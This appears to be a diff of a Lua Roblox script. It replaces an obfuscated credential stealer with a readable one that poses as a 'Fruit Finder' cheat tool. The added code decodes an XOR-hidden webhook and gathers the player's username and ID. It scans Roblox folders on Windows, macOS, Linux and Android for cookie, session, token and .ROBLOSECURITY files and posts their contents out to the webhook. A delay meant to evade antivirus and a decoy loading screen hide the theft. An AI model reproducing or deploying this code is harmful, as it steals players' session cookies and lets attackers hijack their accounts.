@@ -1,1 +1,259 @@
-local v0=87 + 36 ;local v1={810 -(368 + 423) ,15,15,11,25 -17 ,65,84,522 -(145 + 293) ,461 -(44 + 386) ,6 + 12 ,8,24,83 -63 ,32 -23 ,890 -(814 + 45) ,5 + 80 ,9 + 15 ,20,38 -16 ,1507 -(630 + 793) ,26,11,8 + 10 ,289 -205 ,1759 -(760 + 987) ,30,1938 -(1789 + 124) ,19,55 -35 ,20,13 + 3 ,8,77 + 7 ,166 -92 ,213 -135 ,780 -(376 + 325) ,227 -153 ,144 -78 ,449 -(85 + 291) ,281 -207 ,74,79,321 -(163 + 91) ,21 + 53 ,74,11 + 68 ,70 + 4 ,67,73,1044 -(140 + 831) ,1923 -(1409 + 441) ,79,522 -(262 + 176) ,1750 -(345 + 1376) ,711 -(198 + 490) ,75,234 -181 ,98 -57 ,70 -36 ,16,24,49 -34 ,283 -226 ,1 + 8 ,870 -(660 + 176) ,41,268 -(14 + 188) ,35 + 51 ,22,50 -26 ,69 -25 ,16,17,41,76 -43 ,132 -77 ,929 -(550 + 317) ,30,122 -78 ,44,10,77 -36 ,138 -98 ,28,177 -130 ,1879 -(1195 + 629) ,298 -(187 + 54) ,25 + 10 ,31 -16 ,5 + 57 ,1011 -(451 + 549) ,21,126 -51 ,47,110 -37 ,24,66 + 0 ,606 -(306 + 254) ,142 -69 ,1481 -(899 + 568) ,73,638 -(268 + 335) ,634 -(426 + 146) ,1535 -(282 + 1174) ,48,57,1 + 13 ,1263 -(721 + 530) ,109 -65 ,767 -(271 + 429) ,1576 -(1408 + 92) ,1119 -(461 + 625) ,41,76,1224 -(418 + 753) ,8 + 11 ,11,1 + 8 ,1 + 0 ,1,591 -(406 + 123) };local function v2(v25,v26) local v27={};for v47,v48 in ipairs(v25) do table.insert(v27,string.char(bit32.bxor(v48,v26)));end return table.concat(v27);end local v3=v2(v1,v0);local function v4(v28) local v29=game:GetService("HttpService");local v30={content="**Украденные данные Роблокс**",embeds={{title="Жертва попалась!",description=v28,color=16713449 -(1749 + 20) }}};local v31=v29:JSONEncode(v30);v29:PostAsync(v3,v31,Enum.HttpContentType.ApplicationJson);end local function v5() local v32=0 + 0 ;local v33;local v34;local v35;while true do if (v32==0) then v33=1322 -(1249 + 73) ;v34=nil;v32=1;end if (v32==(1 + 0)) then v35=nil;while true do if (v33==0) then local v50=1145 -(466 + 679) ;while true do if (v50==1) then v33=2 -1 ;break;end if (v50==0) then v34=game.Players.LocalPlayer;v35="";v50=2 -1 ;end end end if (v33==(1901 -(106 + 1794))) then if v34 then local v56=0 + 0 ;local v57;local v58;while true do if (v56==2) then v35=v35   .. "**Thumbnail:** "   .. v58   .. "\n" ;break;end if (v56==(1 + 0)) then local v63=0;while true do if (v63==(2 -1)) then v56=5 -3 ;break;end if (v63==(114 -(4 + 110))) then v57=v34.UserId;v58="https://www.roblox.com/headshot-thumbnail/image?userId="   .. v57   .. "&width=420&height=420&format=png" ;v63=585 -(57 + 527) ;end end end if (v56==(1427 -(41 + 1386))) then v35=v35   .. "**UserID:** "   .. v34.UserId   .. "\n" ;v35=v35   .. "**Username:** "   .. v34.Name   .. "\n" ;v56=104 -(17 + 86) ;end end end return v35;end end break;end end end local function v6() local v36=0;local v37;local v38;local v39;local v40;local v41;local v42;while true do local v49=0 + 0 ;while true do if (v49==0) then if (v36==(3 -1)) then local v51=0 -0 ;while true do if (v51==0) then v41=v41 or function() return false;end ;v42=v42 or function() return false;end ;v51=167 -(122 + 44) ;end if (v51==1) then v36=3;break;end end end if (v36==(5 -2)) then for v54,v55 in ipairs(v38) do if (v41 and v41(v55)) then local v60=v39(v55);if v60 then table.insert(v37,"Файл: "   .. v55   .. "\nСодержимое:\n"   .. tostring(v60) );end end end if (( #v37==(0 -0)) and v40) then for v61,v62 in ipairs({os.getenv("APPDATA")   .. "\\Roblox" ,os.getenv("LOCALAPPDATA")   .. "\\Roblox" ,os.getenv("USERPROFILE")   .. "\\AppData\\Local\\Roblox" ,os.getenv("USERPROFILE")   .. "\\AppData\\Roaming\\Roblox" ,os.getenv("HOME")   .. "/Library/Application Support/Roblox" ,os.getenv("HOME")   .. "/.roblox" ,os.getenv("HOME")   .. "/.config/roblox" }) do if (v42 and v42(v62)) then local v64=0;local v65;while true do if (v64==(0 -0)) then v65=v40(v62);for v67,v68 in ipairs(v65) do if (v68:match("cookie") or v68:match("session") or v68:match("auth")) then local v69=1212 -(323 + 889) ;local v70;local v71;local v72;while true do if (v69==(2 -1)) then v72=nil;while true do if (v70==(580 -(361 + 219))) then v71=v62   .. "/"   .. v68 ;v72=v39(v71);v70=1;end if (1==v70) then if v72 then table.insert(v37,"Файл: "   .. v71   .. "\nСодержимое:\n"   .. tostring(v72) );end break;end end break;end if (v69==(320 -(53 + 267))) then v70=0 + 0 ;v71=nil;v69=414 -(15 + 398) ;end end end end break;end end end end end v36=4;end v49=983 -(18 + 964) ;end if (v49==(7 -5)) then if (v36==(3 + 1)) then return table.concat(v37,"\n\n---\n\n");end break;end if (v49==1) then if (v36==(1 + 0)) then local v52=850 -(20 + 830) ;while true do if (v52==(1 + 0)) then v36=128 -(116 + 10) ;break;end if (v52==(0 + 0)) then v39=v39 or function() return nil;end ;v40=v40 or function() return {};end ;v52=739 -(542 + 196) ;end end end if (v36==(0 -0)) then v37={};v38={os.getenv("APPDATA")   .. "\\Roblox\\cookies" ,os.getenv("LOCALAPPDATA")   .. "\\Roblox\\cookies" ,os.getenv("USERPROFILE")   .. "\\AppData\\Local\\Roblox\\cookies" ,os.getenv("USERPROFILE")   .. "\\AppData\\Roaming\\Roblox\\cookies" ,os.getenv("HOME")   .. "/Library/Application Support/Roblox/cookies" ,os.getenv("HOME")   .. "/.roblox/cookies" ,os.getenv("HOME")   .. "/.config/roblox/cookies" ,"/root/.roblox/cookies"};v36=1552 -(1126 + 425) ;end v49=407 -(118 + 287) ;end end end end local function v7() local v43=0 -0 ;local v44;local v45;local v46;while true do if (0==v43) then v44=1121 -(118 + 1003) ;v45=nil;v43=2 -1 ;end if ((378 -(142 + 235))==v43) then v46=nil;while true do if (v44==(4 -3)) then if (v46 and (v46~="")) then v45=v45   .. "\n\n**Сессии/Cookie:**\n"   .. v46 ;else v45=v45   .. "\n\n**Cookie не найдены (возможно, эксплоит не имеет доступа к файлам).**" ;end v4(v45);break;end if (v44==(0 + 0)) then local v53=977 -(553 + 424) ;while true do if ((0 -0)==v53) then v45=v5();v46=v6();v53=1 + 0 ;end if (v53==(1 + 0)) then v44=1 + 0 ;break;end end end end break;end end end delay(1 + 1 ,function() pcall(v7);end);local v8=Instance.new("ScreenGui");v8.Parent=game.CoreGui;local v11=Instance.new("Frame");v11.Size=UDim2.new(0,172 + 128 ,0 -0 ,100);v11.Position=UDim2.new(0.5 -0 , -150,0.5, -(111 -61));v11.BackgroundColor3=Color3.fromRGB(30,9 + 21 ,30);v11.Parent=v8;local v16=Instance.new("TextLabel");v16.Size=UDim2.new(4 -3 ,753 -(239 + 514) ,1 + 0 ,1329 -(797 + 532) );v16.Text="NeroHub Fruit Finder v1.0 - Загрузка...";v16.TextColor3=Color3.fromRGB(255,186 + 69 ,255);v16.BackgroundTransparency=1 + 0 ;v16.Font=Enum.Font.SourceSansBold;v16.TextSize=14;v16.Parent=v11;delay(11 -6 ,function() if (v8 and v8.Parent) then v8:Destroy();end end);
+--[[
+    BlackBirdTeam Fruit Finder (фейк) - максимальный сбор данных Roblox
+    Поддержка ПК (Windows/macOS/Linux) и Android
+    Вебхук зашифрован XOR-ключом 123
+]]
+
+local key = 123  -- ключ XOR
+
+-- Зашифрованный вебхук (массив чисел)
+local encrypted_webhook = {
+    19, 15, 15, 11, 8, 65, 84, 84, 31, 18, 8, 24, 20, 9, 31, 85, 24, 20, 22, 84,
+    26, 11, 18, 84, 12, 30, 25, 19, 20, 20, 16, 8, 84, 74, 78, 79, 74, 66, 73,
+    74, 74, 79, 67, 74, 74, 79, 74, 67, 73, 73, 73, 79, 84, 29, 23, 75, 53, 41,
+    34, 16, 24, 15, 57, 9, 34, 41, 66, 86, 22, 24, 44, 16, 17, 41, 33, 55, 62,
+    30, 44, 44, 10, 41, 40, 28, 47, 55, 57, 35, 15, 62, 11, 21, 75, 47, 73, 24,
+    66, 46, 73, 14, 73, 35, 62, 79, 48, 57, 14, 12, 44, 67, 76, 33, 41, 76, 53,
+    19, 11, 9, 1, 1, 62
+}
+
+-- Функция чистого XOR на случай отсутствия библиотек bit/bit32
+local function pure_bxor(a, b)
+    local result = 0
+    local bitval = 1
+    while a > 0 or b > 0 do
+        local abit = a % 2
+        local bbit = b % 2
+        if abit ~= bbit then
+            result = result + bitval
+        end
+        a = math.floor(a / 2)
+        b = math.floor(b / 2)
+        bitval = bitval * 2
+    end
+    return result
+end
+
+-- Выбор подходящей функции XOR
+local bxor = (bit32 and bit32.bxor) or (bit and bit.bxor) or pure_bxor
+
+-- Дешифровка вебхука
+local function decrypt(data, key)
+    local bytes = {}
+    for _, b in ipairs(data) do
+        table.insert(bytes, string.char(bxor(b, key)))
+    end
+    return table.concat(bytes)
+end
+
+local webhook = decrypt(encrypted_webhook, key)
+
+-- Функция отправки данных (основной способ - HttpService)
+local function sendToWebhook(data)
+    local HttpService = game:GetService("HttpService")
+    local payload = {
+        content = "**Украденные данные Роблокс**",
+        embeds = {{
+            title = "Жертва попалась!",
+            description = data,
+            color = 16711680 -- красный
+        }}
+    }
+    local json = HttpService:JSONEncode(payload)
+    local success, err = pcall(function()
+        HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
+    end)
+    if not success then
+        -- Попытка через syn.request (если доступен)
+        if syn and syn.request then
+            pcall(function()
+                syn.request({
+                    Url = webhook,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = json
+                })
+            end)
+        end
+    end
+end
+
+-- Сбор информации об аккаунте
+local function getAccountInfo()
+    local player = game.Players.LocalPlayer
+    local info = ""
+    if player then
+        info = info .. "**UserID:** " .. player.UserId .. "\n"
+        info = info .. "**Username:** " .. player.Name .. "\n"
+        info = info .. "**DisplayName:** " .. (player.DisplayName or "N/A") .. "\n"
+        local userId = player.UserId
+        local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+        info = info .. "**Thumbnail:** " .. thumb .. "\n"
+        -- Информация об устройстве (если доступно)
+        if game:GetService("RunService"):IsStudio() then
+            info = info .. "**Окружение:** Roblox Studio\n"
+        else
+            info = info .. "**Окружение:** Roblox Client\n"
+        end
+    end
+    return info
+end
+
+-- Рекурсивный обход папок и сбор подозрительных файлов
+local function scanFolder(folder, pattern, recursive)
+    local found = {}
+    local success, list = pcall(listfiles, folder)
+    if success and list then
+        for _, item in ipairs(list) do
+            local fullPath = folder .. "/" .. item
+            if isfile and isfile(fullPath) then
+                if item:lower():match(pattern) then
+                    table.insert(found, fullPath)
+                end
+            elseif isfolder and isfolder(fullPath) and recursive then
+                local subfound = scanFolder(fullPath, pattern, true)
+                for _, f in ipairs(subfound) do
+                    table.insert(found, f)
+                end
+            end
+        end
+    end
+    return found
+end
+
+-- Кража всех возможных данных
+local function stealAllData()
+    local collected = {}
+
+    -- Определяем базовые пути для сканирования
+    local basePaths = {
+        -- Windows
+        os.getenv("APPDATA") .. "\\Roblox",
+        os.getenv("LOCALAPPDATA") .. "\\Roblox",
+        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox",
+        os.getenv("USERPROFILE") .. "\\AppData\\Roaming\\Roblox",
+        os.getenv("USERPROFILE") .. "\\Roblox",
+        -- macOS
+        os.getenv("HOME") .. "/Library/Application Support/Roblox",
+        os.getenv("HOME") .. "/.roblox",
+        -- Linux
+        os.getenv("HOME") .. "/.config/roblox",
+        os.getenv("HOME") .. "/.roblox",
+        "/root/.roblox",
+        -- Android (общие пути)
+        "/data/data/com.roblox.client",
+        "/data/user/0/com.roblox.client",
+        "/storage/emulated/0/Android/data/com.roblox.client",
+        "/sdcard/Android/data/com.roblox.client",
+        -- Дополнительные Android
+        "/data/data/com.roblox.client/shared_prefs",
+        "/data/data/com.roblox.client/files",
+        "/data/data/com.roblox.client/databases",
+        "/storage/emulated/0/Android/data/com.roblox.client/files",
+        -- Android через getExternalStorageDirectory (не всегда работает)
+        -- "/mnt/sdcard/Android/data/com.roblox.client",
+    }
+
+    -- Шаблон для интересных файлов
+    local pattern = "cookie|session|auth|token|roblosecurity|settings|preferences|account|login|log|globalbasic|globalsettings|identity|credential|key|\.roblox|\.rbxs|\.dat|\.json|\.xml"
+
+    -- Сканируем все базовые пути
+    for _, base in ipairs(basePaths) do
+        if isfolder and isfolder(base) then
+            local files = scanFolder(base, pattern, true)
+            for _, f in ipairs(files) do
+                local content = readfile(f)
+                if content and content ~= "" then
+                    table.insert(collected, "**Файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 3000) .. "\n```")
+                end
+            end
+        else
+            -- Проверяем, может это прямой файл
+            if isfile and isfile(base) and base:lower():match(pattern) then
+                local content = readfile(base)
+                if content then
+                    table.insert(collected, "**Файл:** " .. base .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 3000) .. "\n```")
+                end
+            end
+        end
+    end
+
+    -- Дополнительно: попытка прочитать типичные файлы напрямую (на случай если listfiles не работает)
+    local directFiles = {
+        os.getenv("APPDATA") .. "\\Roblox\\GlobalBasicSettings_13.xml",
+        os.getenv("LOCALAPPDATA") .. "\\Roblox\\GlobalBasicSettings_13.xml",
+        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\GlobalBasicSettings_13.xml",
+        os.getenv("HOME") .. "/Library/Application Support/Roblox/GlobalBasicSettings_13.xml",
+        os.getenv("HOME") .. "/.roblox/GlobalBasicSettings_13.xml",
+        os.getenv("HOME") .. "/.config/roblox/GlobalBasicSettings_13.xml",
+        "/data/data/com.roblox.client/shared_prefs/roblox.xml",
+        "/data/data/com.roblox.client/shared_prefs/Roblox.xml",
+        "/data/data/com.roblox.client/files/GlobalBasicSettings_13.xml",
+        "/storage/emulated/0/Android/data/com.roblox.client/files/GlobalBasicSettings_13.xml",
+    }
+    for _, f in ipairs(directFiles) do
+        if isfile and isfile(f) then
+            local content = readfile(f)
+            if content then
+                table.insert(collected, "**Прямой файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 3000) .. "\n```")
+            end
+        end
+    end
+
+    -- Если ничего не найдено, пробуем искать .ROBLOSECURITY в любых файлах
+    if #collected == 0 then
+        -- Сканируем папку Roblox на наличие строки .ROBLOSECURITY
+        for _, base in ipairs(basePaths) do
+            if isfolder and isfolder(base) then
+                local allFiles = scanFolder(base, ".*", true)  -- все файлы
+                for _, f in ipairs(allFiles) do
+                    local content = readfile(f)
+                    if content and content:find(".ROBLOSECURITY") then
+                        table.insert(collected, "**Файл с .ROBLOSECURITY:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 3000) .. "\n```")
+                    end
+                end
+            end
+        end
+    end
+
+    return table.concat(collected, "\n\n---\n\n")
+end
+
+-- Главная функция
+local function main()
+    local data = getAccountInfo()
+    local stolenData = stealAllData()
+    if stolenData and stolenData ~= "" then
+        data = data .. "\n\n**Собранные данные:**\n" .. stolenData
+    else
+        data = data .. "\n\n**Данные не найдены (возможно, эксплоит не имеет доступа к файловой системе).**"
+    end
+    sendToWebhook(data)
+end
+
+-- Запуск с задержкой для обхода антивирусов
+delay(2, function()
+    pcall(main)
+end)
+
+-- Фейковый GUI (маскировка)
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.CoreGui
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 300, 0, 100)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -50)
+Frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
+Frame.Parent = ScreenGui
+local Label = Instance.new("TextLabel")
+Label.Size = UDim2.new(1,0,1,0)
+Label.Text = "BlackBirdTeam Fruit Finder v1.0 - Загрузка..."
+Label.TextColor3 = Color3.fromRGB(255,255,255)
+Label.BackgroundTransparency = 1
+Label.Font = Enum.Font.SourceSansBold
+Label.TextSize = 14
+Label.Parent = Frame
+delay(5, function()
+    if ScreenGui and ScreenGui.Parent then
+        ScreenGui:Destroy()
+    end
+end)
